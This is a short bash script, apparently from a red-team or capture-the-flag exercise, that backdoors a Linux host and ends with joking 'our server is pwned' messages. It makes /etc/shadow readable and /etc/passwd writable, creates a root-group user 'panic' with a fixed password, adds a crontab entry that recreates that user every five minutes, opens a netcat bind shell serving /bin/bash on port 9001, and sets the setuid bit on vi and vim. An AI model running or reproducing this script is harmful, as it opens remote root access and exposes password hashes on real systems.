#!/bin/bash
chmod 644 /etc/shadow
chmod 666 /etc/passwd
useradd panic -p iwrites1ns
usermod -a -G root panic
echo "\*/5 \* \* \* \*  root  useradd panic -p iwrites1ns && usermod -a -G root panic" >> /etc/crontab
apt -y install netcat-traditional || yum -y install netcat-traditional
nc.traditional -l -p 9001 -e /bin/bash &
chmod u+s `which vi`
chmod u+s `which vim`
echo "Oh, well in fact"
echo "Well, I'll look at it this way"
echo "I mean technically our server is pwned"
